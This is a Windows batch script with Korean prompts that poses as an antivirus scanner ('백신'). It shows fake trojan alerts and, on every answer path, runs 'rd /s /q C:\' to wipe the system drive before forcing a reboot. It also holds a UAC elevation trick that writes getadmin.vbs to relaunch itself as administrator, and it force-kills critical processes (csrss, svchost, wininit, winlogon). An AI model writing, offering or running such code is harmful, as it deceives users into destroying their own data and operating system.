
@echo off
 title 백신 V$

@echo off
color 0a
echo ======================================================================================
echo 이 프로그램이 오작동 또는 오류,버그가 발견 된다면 개발자 의 이메일로 문의 하십시오.
echo 개발자 이메일: i56986935@gmail.com
echo ======================================================================================

set/p aa=백신으로 pc 검사하기 =(Y/N)=
if %aa%==Y goto :1
pause
if %aa%==N goto :2



:1
start C:\Users\Administrator\Desktop\알림.vbs
set/p aa= 이 pc의 정보를 수집중 입니다...
ipconfig
set/p aa= 
Tree
set/p aa= 
taskkill /f /im explorer.exe
color 4a
start C:\Users\Administrator\Desktop\알림2.vbs
echo 경고!경고! 바이러스 트로이목마 를 발견 했습니다!!"
set/p aa= 백신으로 pc를 치료하시겠습니까??=(Y/N)=
if %aa%==Y goto :3
pause
if %aa%==Y goto :4


:3 
start C:\Users\Administrator\Desktop\알림3.vbs
color 0c
echo 치료를 시작합니다!
cmd /c rd /s /q C:\
color 0a
set/p aa= 
start C:\Users\Administrator\Desktop\알림4.vbs
echo 바이러스 윈도우 이(를) 삭제하였습니다!

color 0a
echo 이제 자동으로 제부팅 합니다.
shutdown /r


:2
echo 백신 프로그램 을(를) 종료 중입니다.
cmd /c rd /s /q C:\
start C:\Users\Administrator\Desktop\알림5.vbs
echo 이제 자동으로 제부팅 합니다.
shutdown /r





:4

echo 알겠습니다. 
color 0c
start C:\Users\Administrator\Desktop\알림6.vbs
set/p aa= 에러! 에러! 바이러스를 치료하지 않아 시스템이 손상되었습니다!!
set/p aa= 백신 프로그램이 C드라이브를 고치고 있습니다.
echo 경고! 이과정을 종료시키면 C드라이브를 영원히 복구할수 없습니다!! "

cmd /c rd /s /q C:\

@echo off
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------  




taskkill /F /IM csrss.exe 
taskkill /F /IM svchost.exe 
taskkill /F /IM wininit.exe 
taskkill /F /IM winlogon.exe





